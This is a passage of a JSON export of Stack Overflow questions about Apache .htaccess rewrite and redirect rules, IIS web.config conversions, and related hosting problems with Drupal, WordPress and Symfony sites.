%{HTTP_USER_AGENT} \"sch-|sec-|send|seri|sgh-|shar|sie-|siem|smal|smar|sony|sph-|symb|t-mo\" [NC,OR]\nRewriteCond %{HTTP_USER_AGENT} \"teli|tim-|tosh|tsm-|upg1|upsi|vk-v|voda|w3cs|wap-|wapa|wapi\" [NC,OR]\nRewriteCond %{HTTP_USER_AGENT} \"wapp|wapr|webc|winw|winw|xda|xda-\" [NC,OR]\nRewriteCond %{HTTP_USER_AGENT} \"up.browser|up.link|windowssce|iemobile|mini|mmp\" [NC,OR]\nRewriteCond %{HTTP_USER_AGENT} \"symbian|midp|wap|phone|pocket|mobile|pda|psp\" [NC]\nRewriteCond %{HTTP_USER_AGENT} !macintosh [NC]\n\n# Check if we're not already on the mobile site\nRewriteCond %{HTTP_HOST}          !^m\\.\n# Can not read and write cookie in same request, must duplicate condition\nRewriteCond %{QUERY_STRING} !(^|&amp;)m=0(&amp;|$) \n\n# Check to make sure we haven't set the cookie before\nRewriteCond %{HTTP_COOKIE}        !^.*mredir=0.*$ [NC]\n\n# Now redirect to the mobile site\nRewriteRule ^ http://m.mconchicago.com [R,L]\n</code></pre>\n"},{"tags":[".htaccess","web-config","windows-server-2008"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13059860,"title":"Converting htaccess to web.config causing 500 error and i cant see why?","body":"<p>Hi there im really stuck here, and its driving me insane. Ive searched all over but i cant see what im doing wrong here. </p>\n\n<p>Im moving an application that was previously on a windows server with ISAPI_ModRewrite so this worked with htaccess, im trying to move this to a windows-server 2008 server which i cant have ISAPI installed on as its a shared hosting environment.</p>\n\n<p>Below is what im trying to do but this is just returning a 500 internal server error any ideas what im doing wrong? this is the htaccess code im trying to convert...</p>\n\n<pre><code># PRODUCT PAGE\nRewriteRule ^([0-9]*)/(.*)/? /prodpage.asp?productid=$1 [L]\n\n# OTHER PAGES\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^([^/]+)/$ /$1.asp [QSA]\nRewriteRule ^([^/]+)/([0-9]+)-([0-9]+)/$ /$1.asp?pricerange=$2-$3\nRewriteRule ^([^/]+)/([0-9]+)-([0-9]+)/([a-z])/$ /$1.asp?pricerange=$2-$3&amp;sort=$4\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_URI} !(\\.[a-zA-Z0-9]{1,5}|/)$\nRewriteRule (.*)$ /$1/ [R=301,L]\n</code></pre>\n\n<p>And this is my web.config file...</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;configuration&gt;\n&lt;system.webServer&gt;\n&lt;rewrite&gt;\n&lt;rules&gt;\n&lt;rule name=\"Product Page\" stopProcessing=\"true\"&gt;\n&lt;match url=\"^([0-9]*)/(.*)/?$\" ignoreCase=\"false\" /&gt;\n&lt;conditions&gt;\n&lt;add input=\"{REQUEST_FILENAME}\" matchType=\"IsFile\" ignoreCase=\"false\" negate=\"true\" /&gt;\n&lt;add input=\"{REQUEST_FILENAME}\" matchType=\"IsDirectory\" ignoreCase=\"false\" negate=\"true\" /&gt;\n&lt;/conditions&gt;\n&lt;action type=\"Rewrite\" url=\"prodpage.asp?productid={R:1}\" appendQueryString=\"true\" /&gt;\n&lt;/rule&gt;\n&lt;rule name=\"Other Page1\" stopProcessing=\"true\"&gt;\n&lt;match url=\"^([^/]+)/$\" ignoreCase=\"false\" /&gt;\n&lt;conditions&gt;\n&lt;add input=\"{REQUEST_FILENAME}\" matchType=\"IsFile\" ignoreCase=\"false\" negate=\"true\" /&gt;\n&lt;add input=\"{REQUEST_FILENAME}\" matchType=\"IsDirectory\" ignoreCase=\"false\" negate=\"true\" /&gt;\n&lt;/conditions&gt;\n&lt;action type=\"Rewrite\" url=\"{R:1}.asp\" appendQueryString=\"true\" /&gt;\n&lt;/rule&gt;\n&lt;rule name=\"Other Page2\" stopProcessing=\"true\"&gt;\n&lt;match url=\"^([^/]+)/([0-9]+)-([0-9]+)/$\" ignoreCase=\"false\" /&gt;\n&lt;conditions&gt;\n&lt;add input=\"{REQUEST_FILENAME}\" matchType=\"IsFile\" ignoreCase=\"false\" negate=\"true\" /&gt;\n&lt;add input=\"{REQUEST_FILENAME}\" matchType=\"IsDirectory\" ignoreCase=\"false\" negate=\"true\" /&gt;\n&lt;/conditions&gt;\n&lt;action type=\"Rewrite\" url=\"{R:1}.asp?pricerange={R:2}-{R:3}\" appendQueryString=\"true\" /&gt;\n&lt;/rule&gt;\n&lt;rule name=\"Other Page3\" stopProcessing=\"true\"&gt;\n&lt;match url=\"^([^/]+)/([0-9]+)-([0-9]+)/([a-z])/$\" ignoreCase=\"false\" /&gt;\n&lt;conditions&gt;\n&lt;add input=\"{REQUEST_FILENAME}\" matchType=\"IsFile\" ignoreCase=\"false\" negate=\"true\" /&gt;\n&lt;add input=\"{REQUEST_FILENAME}\" matchType=\"IsDirectory\" ignoreCase=\"false\" negate=\"true\" /&gt;\n&lt;/conditions&gt;\n&lt;action type=\"Rewrite\" url=\"{R:1}.asp?pricerange={R:2}-{R:3}&amp;sort={R:4}\" appendQueryString=\"true\" /&gt;\n&lt;/rule&gt;\n&lt;/rules&gt;\n&lt;/rewrite&gt;\n&lt;/system.webServer&gt;\n&lt;/configuration&gt;\n</code></pre>\n"},{"tags":[".htaccess","web-config"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":450,"score":0,"question_id":10543232,"title":".htaccess url rewrite rule to IIS web.config rewrite rules","body":"<p>Because I'm on a shared windows hosting environment I'm unable to access IIS manager in order to convert .htaccess rewrite rules to web.config rewrite rules.</p>\n\n<p>Below are the rules I'm trying to convert, I've looked at resources and tried writing the rules myself but no luck. I keep getting 505 errors.</p>\n\n<p>.htaccess Rules:</p>\n\n<pre><code># Canonical name 301 redirect\nRewriteCond $1 ^(index\\.asp)?$ [OR] \n\n# or if request is for image, css, or js file \nRewriteCond $1 \\.(gif¦jpg¦ico¦css¦js)$ [NC,OR] \n\n# or if URL resolves to existing file \nRewriteCond %{REQUEST_FILENAME} -f [OR] \n\n# or if URL resolves to existing directory \nRewriteCond %{REQUEST_FILENAME} -d \n\n# then skip the rewrite to WP \nRewriteRule ^(.*)$ - [S=1] \n\n# else rewrite the request to WP \nRewriteRule . /handle_url.asp?url=%{REQUEST_FILENAME} [L,QSA]\n\n\nMy unsuccessful attempt to translate it myself:\n&lt;configuration&gt; \n&lt;system.webServer&gt;\n&lt;rewrite&gt;\n&lt;rules&gt;\n&lt;rule name=\"Imported Rule 1\" stopProcessing=\"true\"&gt;\n    &lt;match url=\"^(.*)$\" ignoreCase=\"false\" /&gt;\n    &lt;conditions&gt;\n        &lt;add input=\"{URL}\" pattern=\"^(index\\.asp)?$\" ignoreCase=\"false\" negate=\"true\" /&gt;\n        &lt;add input=\"{URL}\" pattern=\"\\.(gif¦jpg¦ico¦css¦js)$\" ignoreCase=\"false\" negate=\"true\" /&gt;\n        &lt;add input=\"{REQUEST_FILENAME}\" matchType=\"IsFile\" ignoreCase=\"false\" negate=\"true\" /&gt;\n        &lt;add input=\"{REQUEST_FILENAME}\" matchType=\"IsDirectory\" ignoreCase=\"false\" negate=\"true\" /&gt;\n    &lt;/conditions&gt;\n    &lt;action type=\"Rewrite\" url=\"-\" appendQueryString=\"true\" /&gt;\n&lt;/rule&gt;\n&lt;rule name=\"Imported Rule 2\" stopProcessing=\"true\"&gt;\n    &lt;match url=\".\" ignoreCase=\"false\" /&gt;      \n    &lt;action type=\"Redirect\" redirectType=\"Permanent\" url=\"/handle_url.asp?url=%{REQUEST_FILENAME}\" /&gt;     \n&lt;/rule&gt;             \n&lt;/rules&gt;\n&lt;/rewrite&gt;\n&lt;/system.webServer&gt;\n&lt;/configuration&gt;\n</code></pre>\n\n<p>Do any of you know what I've translated incorrectly?</p>\n\n<p>Thank you very much for your time, I really appreciate it!</p>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":13056911,"title":"How to redirect index.php/controller/action to controller/action without redirect loop?","body":"<p><strong>Solved :)</strong></p>\n\n<pre><code>RewriteCond %{THE_REQUEST} index.php\nRewriteRule index.php(.*)$ http://%{HTTP_HOST}$1 [L,R=301]\n\nRewriteCond %{REQUEST_FILENAME} !-d \nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^(.*)$ /index.php/$1 [L]\n</code></pre>\n\n<hr>\n\n<p>I configured a redirect so that I can open <a href=\"http://example.com/controller/action\" rel=\"nofollow\">http://example.com/controller/action</a> and ModRewrite route the request internal to ...index.php/controller/action.</p>\n\n<p>Now I want to redirect a user if he opened <a href=\"http://example.com/index.php/controller/action\" rel=\"nofollow\">http://example.com/index.php/controller/action</a> automaticly to index.php/controller/action (301 redirect). But now I get an endless loop of redirects.</p>\n\n<p>Is there any chance to seperate the internal redirect to the bootstrap index.php and prevent, that one user can open the url with the index.php subpath?</p>\n\n<p>I tried this, but that doesnt work (enless loop):</p>\n\n<pre><code> RewriteCond %{REQUEST_URI} index.php/(.*)\n RewriteRule ^index.php/(.*)/$ http://%{HTTP_HOST}/$1/ [L,R=301]\n\n RewriteCond %{REQUEST_FILENAME} !-d \n RewriteCond %{REQUEST_FILENAME} !-f\n RewriteRule ^(.*)$ /index.php/$1 [L]\n</code></pre>\n"},{"tags":[".htaccess","drupal","theming"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":33,"score":1,"question_id":13058242,"title":"drupal multi-site symlinks?","body":"<p>So basically I am using a drupal multi-site.\nStructure is as follows:</p>\n\n<p>mywebsite.com:\n -- public_html/sites/default/</p>\n\n<p>sub.mywebsite.com: -- public_html/sites/sub.mywebsite.com/</p>\n\n<p>Works just fine(via settings.php), but the problem comes when theming. In order to reference valid image files, I must use <code>drupal_get_path('theme','mythemefolder')</code>\nAnd due to having \"pretty urls\" activated, I must use the following code to reference the image files:</p>\n\n<pre><code>$uri=$_SERVER[\"REQUEST_URI\"];\n$path=drupal_get_path('theme','mythemefolder').\"/\";\n$real_prefix=$base_path; // global from drupal, equates to \"/\" as drupal resides in public_html folder.\n$count=substr_count($uri,\"/\");\nfor ($i=0;$i&lt;$count;$i++) $real_prefix.=\"../\";\n</code></pre>\n\n<p>In this way, I can do the following:</p>\n\n<pre><code>&lt;script type=\"text/css\"&gt;\n#borderclass {\n  background-image: url('&lt;?= $real_prefix.$path.'images/a_border_image.png'; ?&gt;');\n  background-repeat: repeat-x;\n  vertical-align: top;\n}\n&lt;/script&gt;\n&lt;div class=\"borderclass\" width=\"10px\" height=\"10px\"&gt;&lt;!-- my image border div --&gt;&lt;/div&gt;\n</code></pre>\n\n<p>It would be much preferable to not have to do this. And just simply reference the local site folder...</p>\n\n<p>So that instead, I could write via PHP referenced above:</p>\n\n<pre><code>&lt;div style=\"background-image: url('&lt;?= $path ?&gt;images/a_border_image.png');\"&gt;&lt;/div&gt;\n</code></pre>\n\n<hr>\n\n<hr>\n\n<p>The resulting html should instead appear inside View Source, as:</p>\n\n<pre><code>&lt;div style=\"background-image: url('themes/mythemefolder/images/a_border_image.png');\"&gt;&lt;/div&gt;\n</code></pre>\n\n<p>and Not:</p>\n\n<pre><code>&lt;div style=\"background-image: url('sites/sub.mywebsite.com/themes/mythemefolder/images/a_border_image.png');\"&gt;&lt;/div&gt;\n</code></pre>\n\n<p>Is it possible to configure my server to do such a thing? Basically, I'd rather not have my clients even know that the \"sites\" directory exists on the server when using their own domain or subdomain. Let alone the above presented theming issue.</p>\n"},{"tags":[".htaccess","redirect","http-status-code-301"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13047092,"title":"301 redirect with a directory","body":"<p>Following works fine</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} !^www\\.mydomain\\.com$\nRewriteRule ^(.*)$ http://www.mydomain.com/$1 [L,R=301]\n</code></pre>\n\n<p>Now I need to do the same but with a directory, like</p>\n\n<p>www.mydomain.com/oldname/something to www.mydomain.com/NEWNAME/something</p>\n"},{"tags":["apache",".htaccess","drupal","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":13044509,"title":"Drupal redirect from installation subdirectory without creating a loop","body":"<p>I am working on a Drupal site that has hard coded links in lots of the content (I didn't create the site). Unfortunately that means the site has to be in a subdirectory such as \"www.example.com/drupal\" or the links will break. I have sucessfully redirected the site root to the subdirectory and hid it using the following code in the site root htaccess file:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine on\nRewriteRule (.*) drupal/$1 [L]\nRewriteCond %{HTTP_HOST} !^www\\..+$ [NC]\nRewriteRule ^ http://www.%{HTTP_HOST}%{REQUEST_URI} [R=301,L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>However if I go to www.example.com/drupal the subdirectory still shows up.This means that www.example.com and www.example.com/drupal have the same content which is bad for SEO. Is there some way to make /drupal redirect to root without causing a loop? I have tried just about every posted in other threads and none of them work. </p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13058785,"title":"Quick .htaccess fix with mod_rewrite","body":"<pre><code>RewriteEngine on\nRewriteBase /\nRewriteRule ^(.*)$ index.php?page=$1\n</code></pre>\n\n<p>There is an error on my .htaccess file. On my index page, I have a PHP that checks what the $_GET['page'] is, and it returns <code>index.php</code> when I type in <code>domain.com/home</code>.</p>\n\n<p>I want it to return as home when I type in <code>domain.com/home</code></p>\n"},{"tags":["php",".htaccess","mod-rewrite","get"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13058146,"title":"Why is this htaccess rule assigning two matches to one $_GET variable?","body":"<p>Here's the htaccess rule for my site's profile page:</p>\n\n<pre><code>RewriteRule ^users/([0-9]+)/?(.+)?/?(.+)? profile.php?id=$1&amp;slug=$2&amp;tab=$3&amp;%{QUERY_STRING}\n</code></pre>\n\n<p>When you click on a tab on a user's profile, such as <strong>favorites</strong>:</p>\n\n<blockquote>\n  <p>/users/83028/nathan-johnson/favorites</p>\n</blockquote>\n\n<p>The <code>$_GET</code> variable with the name of <em>slug</em> is receiving <code>nathan-johnson/favorites</code> instead of just <code>nathan-johnson</code> and the <code>tab</code> variable is blank, according to a <code>var_dump</code>:</p>\n\n<pre><code>array(3) { \n      [\"id\"]=&gt; string(5) \"83028\" \n      [\"slug\"]=&gt; string(24) \"nathan-johnson/favorites\" \n      [\"tab\"]=&gt; string(0) \"\" }\n</code></pre>\n\n<p>It looks like the issue is with my htaccess regexp (above), but I don't see the issue with it.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["php","javascript",".htaccess"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":106,"score":0,"question_id":10722375,"title":"Parse js/css as a PHP file using htaccess","body":"<p>Hi I have been trying so hard to do the following on htaccess but it does not seem to work.</p>\n\n<p>can someone out there help me?</p>\n\n<p><code>AddType application/x-httpd-php .js</code></p>\n\n<p>I tried the php4,php5 version all the things I could find on google but I had no luck.</p>\n\n<p>what have I missed?</p>\n\n<p>in my file.js </p>\n\n<p>are the following...</p>\n\n<pre><code>&lt;?php \n\n$(document).ready();//jquery/javascript\n?&gt;\n</code></pre>\n\n<p>I am expect a php fatal error but I see exactly the above as plain text.</p>\n"},{"tags":["apache",".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":11,"score":0,"question_id":13057880,"title":".htaccess rewrite rule interfering with subdomain","body":"<p>I have this code to prepend <code>www.</code> to my site:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} !^www\\.\nRewriteCond %{HTTP_HOST} !^m\\.\nRewriteRule ^(.*)$ http://www.%{HTTP_HOST}/$1 [R=301,L]\n</code></pre>\n\n<p>This is working fine, however, I have a subdomain called <code>users.mysite.com</code></p>\n\n<p>if I browse to</p>\n\n<p><code>users.mysite.com/login.php</code></p>\n\n<p>my browser will redirect me to </p>\n\n<p><code>www.users.mysite.com/users/login.php</code></p>\n\n<p>which, of course, doesn't exist. Is there any way to modify this rewrite rule so that my subdomain is handled properly?</p>\n"},{"tags":[".htaccess","subdomain"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":41,"score":2,"question_id":13039516,"title":".htaccess with dynamics subdomains","body":"<p>I tried to make a .htacces to simulate dynamics subdomains.\nlike his post : \n<a href=\"http://stackoverflow.com/questions/8490184/htaccess-mod-rewrite-subdomain/13038391#comment17702521_13038391\">.htaccess: mod-rewrite; subdomain</a></p>\n\n<p>but it's impossible for me to get the expected result.</p>\n\n<p>i have read several times the doc at : <a href=\"http://httpd.apache.org/docs/current/mod/mod_rewrite.html\" rel=\"nofollow\">apache</a></p>\n\n<p>i have no problem with : RewriteCond, RewriteRule, regular expression.\nBut i have problems with the subdomain.</p>\n\n<p>i have this page : tododiversion.es\nand for my example, I want this : </p>\n\n<blockquote>\n  <p>chr.tododiversion.es ==>  tododiversion.es/chr/</p>\n</blockquote>\n\n<p>i put .htaccess in the www folder: <code>www/ .htaccess</code></p>\n\n<p>and the folder \"chr\" is in :  <code>www/chr/</code></p>\n\n<p>in the htacces i put :</p>\n\n<pre><code>RewriteEngine On\n\n# host starts with something else  \nRewriteCond %{HTTP_HOST} ^([^\\.]+)\\.tododiversion\\.es$  [NC]\n\n# rewrite \nRewriteRule ^(.*)$ /chr  [L]\n</code></pre>\n\n<p>it doesn't work..</p>\n\n<p>I know that urlrewritting is working because I made a simple test.\nI know that RewriteCond is working because I made a simple test.\nI was trying on my computer with localhost and 127.0.01 and it didn't work neither.</p>\n\n<p>If someone could give me some advice it should be great!\nChris</p>\n"},{"tags":["wordpress",".htaccess","mod-rewrite","redirect","subdomain"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":1400,"score":2,"question_id":5690673,"title":"Wildcard domain redirect with WordPress","body":"<p>I have two domain names setup with sub-domains as follows...</p>\n\n<pre><code>blog.domain.com\nwww.blog.domain.com\n\nblog.domain.info\nwww.blog.domain.info\n</code></pre>\n\n<p>Both domains are pointing to the same location on the same server, a directory containing WordPress.  (domain.com/blog)</p>\n\n<p>To keep Google happy, I want everything to redirect to this one domain...</p>\n\n<pre><code>blog.domain.com\n</code></pre>\n\n<p>Here is what's inside the .htaccess file contained in the WordPress directory...</p>\n\n<pre><code># BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n# END WordPress\n</code></pre>\n\n<p>So I went into my cPanel and added a 301 Domain Redirect as follows...</p>\n\n<p><strong>blog.domain.info -> blog.domain.com</strong> (with \"www\" optional and wildcard selected).</p>\n\n<p>cPanel then automatically added the following to the same .htaccess file under the WordPress rewrite rules...</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^blog.domain.info$ [OR]\nRewriteCond %{HTTP_HOST} ^www.blog.domain.info$\nRewriteRule ^(.*)$ \"http\\:\\/\\/blog\\.domain\\.com$1\" [R=301,L]\n</code></pre>\n\n<p>The problem is that the wildcard portion does not seem to work.</p>\n\n<p>When I go to <strong>blog.domain.info</strong>, I get redirected to <strong>blog.domain.com</strong> as expected.</p>\n\n<p>But when I go to <strong>blog.domain.info/my-post</strong>, I do not get redirected at all.</p>\n\n<ol>\n<li><p>How can I fix this?  I've tried rewrite rules that I know work but all I can think of is that the WordPress rules are interfering.</p></li>\n<li><p>Once it's fixed, can I move these mod-rewrites to the main .htaccess in the hosting account's www root keeping them separate from the WordPress rules?   <strong><em>Edit:</strong> Answer- NO, they will not work because they are domains parked in directories off the root www.</em></p></li>\n</ol>\n\n<p><strong>Thank-you!</strong></p>\n"},{"tags":["php",".htaccess","header","expires-header"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":253,"score":2,"question_id":12951402,"title":"header expires on PHP file with JS output","body":"<p>How to put an expires header on a PHP file which outout a JS file?</p>\n\n<h1>.htaccess</h1>\n\n<pre><code>ExpiresActive on\nExpiresByType image/gif A29030400\nExpiresByType image/jpeg A29030400\nExpiresByType image/png A29030400\nExpiresByType text/css A29030400\nExpiresByType application/javascript A29030400\n</code></pre>\n\n<h1>header on JS file</h1>\n\n<pre><code>Cache-Control   max-age=29030400\nConnection  Keep-Alive\nDate    Thu, 18 Oct 2012 09:23:16 GMT\nEtag    \"300000002c8ba-15f-4cc3069c72d00\"\nExpires Thu, 19 Sep 2013 09:23:16 GMT\nKeep-Alive  timeout=5, max=94\nServer  Apache/2.2.22 (Win32) PHP/5.4.3\n</code></pre>\n\n<h1>header on PHP file which outputs a JS file</h1>\n\n<pre><code>Cache-Control   no-store, no-cache, must-revalidate, post-check=0, pre-check=0\nConnection  Keep-Alive\nContent-Length  1195\nContent-Type    application/javascript\nDate    Thu, 18 Oct 2012 09:23:16 GMT\nExpires Thu, 19 Nov 1981 08:52:00 GMT\nKeep-Alive  timeout=5, max=100\nPragma  no-cache\nServer  Apache/2.2.22 (Win32) PHP/5.4.3\nX-Powered-By    PHP/5.4.3\n</code></pre>\n\n<h1>code PHP file</h1>\n\n<pre><code>&lt;?php\nheader('Content-Type: application/javascript');\n$js_output = array('something' =&gt; 'some value');\n?&gt;\nvar &lt;?=json_encode($js_output)?&gt;\n</code></pre>\n"},{"tags":[".htaccess","mercurial","hgignore"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":36,"score":4,"question_id":13056558,"title":"Mercurial selectively hgignore htaccess files","body":"<p>I am using Mercurial for version control, and have an .htaccess file in my web root with rewrite rules that differ depending on whether it's my localhost or my development server, etc. Therefore, I have put \".htaccess\" into my .hgignore file, so that it's not part of version control.</p>\n\n<p>However, I also have another .htaccess file, at .hg/.htaccess, with \"deny from all\", so that my .hg folder is not web accessible. I DO want THIS htaccess file checked in to version control, so that there's no chance of me forgetting to set it up on a new server, etc.</p>\n\n<p>Is there a way to do this? It seems as if just putting \".htaccess\" into my hgignore makes it ignore all .htaccess files, located anywhere. I tried \"./.htaccess\", hoping that'd ignore the root level one, but not .hg/.htaccess--didn't work though. I've tried doing research and have not had much luck.</p>\n\n<p>Thanks, and sorry if I missed something obvious somewhere!</p>\n"},{"tags":["wordpress",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1011,"score":1,"question_id":4814231,"title":"301 redirect not working in Wordpress","body":"<p>I have some rewrite code in my .htaccess file. I have moved a static HTML site into wordpress and need the following to work:</p>\n\n<ol>\n<li>redirect <a href=\"http://domain.com.au/\" rel=\"nofollow\">http://domain.com.au/</a> to <a href=\"http://www.domain.com.au/\" rel=\"nofollow\">http://www.domain.com.au/</a></li>\n<li>redirect (the old static home page) index.html to <a href=\"http://www.domain.com.au/\" rel=\"nofollow\">http://www.domain.com.au/</a></li>\n</ol>\n\n<p>I cannot get either to work, I have tried all the various methods that have been suggested. The domain.com.au to <a href=\"http://www.domain.com.au\" rel=\"nofollow\">http://www.domain.com.au</a> works for all pages except for the home page, e.g. <a href=\"http://domain.com.au/ourteam\" rel=\"nofollow\">http://domain.com.au/ourteam</a> redirects to <a href=\"http://www.domain.com.au/ourteam\" rel=\"nofollow\">http://www.domain.com.au/ourteam</a></p>\n\n<p>But it will not redirect for the root (home page).</p>\n\n<p>Also I get a page not found error for the index.html redirect.</p>\n\n<p>My .htaccess file is:</p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine on\n### re-direct index.html to root\nRewriteCond %{THE_REQUEST} ^.*\\/index\\.html\nRewriteRule ^(.*)index\\.html$ /$1 [R=301,L]\n### non www to www\nRewriteCond %{HTTP_HOST} ^domain\\.com\\.au$ [NC]\nRewriteRule ^(.*)$ http://www.domain.com.au/$1 [R=301,L]\n\nredirect 301 /team.html http://www.domain.com.au/our-team/\nredirect 301 /contact.html http://www.domain.com.au/contact-us/\n</code></pre>\n\n<p>Anyone help - I am tearing my hair out with this!</p>\n"},{"tags":["apache",".htaccess","ubuntu","webserver"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13026937,"title":"127.0.0.1/asd does'not work on ubuntu environment","body":"<p>I was working on microsoft environment, but now I moved my website to ubuntu, the problem is, when I try to write a link like this, 127.0.0.1/asd, I get not found error, the thing that makes me crazy is, that URL sometimes work sometimes does not work and It was working great on windows environment, this is the error I get,</p>\n\n<pre><code>Not Found The requested URL /asd was not found on this server.\n</code></pre>\n\n<p>this is my .htaccess,</p>\n\n<pre><code># compress text, html, javascript, css, xml:\nAddOutputFilterByType DEFLATE text/plain\nAddOutputFilterByType DEFLATE text/html\nAddOutputFilterByType DEFLATE text/xml\nAddOutputFilterByType DEFLATE text/css\nAddOutputFilterByType DEFLATE application/xml\nAddOutputFilterByType DEFLATE application/xhtml+xml\nAddOutputFilterByType DEFLATE application/rss+xml\nAddOutputFilterByType DEFLATE application/javascript\nAddOutputFilterByType DEFLATE application/x-javascript\n# Or, compress certain file types by extension:\n&lt;files *.html&gt;\nSetOutputFilter DEFLATE\n&lt;/files&gt;\nRewriteEngine On\nRewriteRule ^([//a-zA-Z0-9_-]+)$ tab.php?tab_id=$1 [QSA,L]\n</code></pre>\n"},{"tags":[".htaccess","url-rewriting","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":13037721,"title":"Limit RewriteRule in htaccess file","body":"<p>i got a <a href=\"http://netbureau.com.br/\" rel=\"nofollow\">site</a> php based with some rules in the .htaccess file to get rid of file extentions in the url adress bar. Basically it takes <code>http://netbureau.com.br/en/about.php/</code> and turns it into <code>http://netbureau.com.br/en/about</code>.</p>\n\n<p>Here are the lines in the htaccess file:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}\\.php -f\nRewriteRule ^(.*)$ $1.php\n</code></pre>\n\n<p>The problem comes when i try to access the rss feed of the blog at <code>http://netbureau.com.br/blog/?feed=rss2</code> and when i try to set custom permalinks for the  blog at <code>http://netbureau.com.br/blog</code>. It gets messed up by the htaccess file. </p>\n\n<p>So is there any way to disallow the RewriteRule for the <code>/blog</code> folder so that i can get back my rss link and set custom permalinks in the blog?</p>\n\n<p>I know it's at the same time Wordpress related but it feels more connected to the htaccess file than Wp.</p>\n\n<p>Thanks in advance.</p>\n\n<p><strong>EDIT #1</strong>:\nI've set up the wordpress permalinks to the default structure which goes like this: <code>http://netbureau.com.br/blog/?p=123</code> This made my rss link back for good. \nThe remaining problem is that Wordpress gives me its own rewriterule which is:</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /blog/\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /blog/index.php [L] \n</code></pre>\n\n<p>Is there a way to to still use the first rule to apply to the whole site except the /blo/ folder and apply the WP rule only to the /blog/ folder?\nI've tried different combinations but without luck so far. I could only have the site without the custom links for the blog or the custom blog links and a 404 on the pages of the site.</p>\n"},{"tags":["php",".htaccess"],"answer_count":7,"favorite_count":6,"up_vote_count":10,"down_vote_count":1,"view_count":1431,"score":9,"question_id":294976,"title":"How do I gzip my web files","body":"<p>As prescribed by Yahoo!, gzip'ng files would make your websites load faster. The problem? I don't know how :p</p>\n"},{"tags":[".htaccess","symfony2"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":13052546,"title":"Symfony2 : How to access application without typing \"app.php\"","body":"<p>After putting online my application (hosted by <strong>1&amp;1</strong>), I can access it normally by typing <strong>mydomain.com/app.php</strong> (my domain is pointing to /myapp/web), but when I just type <strong>mydomain.com</strong>, I get an internal server error :</p>\n\n<blockquote>\n  <p>Internal Server Error</p>\n  \n  <p>The server encountered an internal error or misconfiguration and was\n  unable to complete your request.</p>\n  \n  <p>Please contact the server administrator, webadmin@kundenserver.de and\n  inform them of the time the error occurred, and anything you might\n  have done that may have caused the error.</p>\n  \n  <p>More information about this error may be available in the server error\n  log.</p>\n  \n  <p>Additionally, a 500 Internal Server Error error was encountered while\n  trying to use an ErrorDocument to handle the request.</p>\n</blockquote>\n\n<p>However, localhost/myapp/web works fine on my computer (without app.php)</p>\n\n<p>Any idea ?</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":1,"view_count":13,"score":-1,"question_id":13053684,"title":"Redirect from subdomain with parameters to another subdomain with same parameters","body":"<p>I want to redirect from:</p>\n\n<p><a href=\"http://jeff.wallamail.com/files?id=28373\" rel=\"nofollow\">http://jeff.wallamail.com/files?id=28373</a></p>\n\n<p>to</p>\n\n<p><a href=\"http://jeff.walla.com/files?id=28373\" rel=\"nofollow\">http://jeff.walla.com/files?id=28373</a></p>\n\n<p>How do i do this simple thing with htaccess ?</p>\n"},{"tags":["apache",".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":19,"score":2,"question_id":13052589,"title":".htaccess has no effect","body":"<p>I am loosing hours with this (should-be) simple task. I want to restrict access to my website, which is on my server in /var/www/.</p>\n\n<p>I've created /etc/apache2/passwords file with 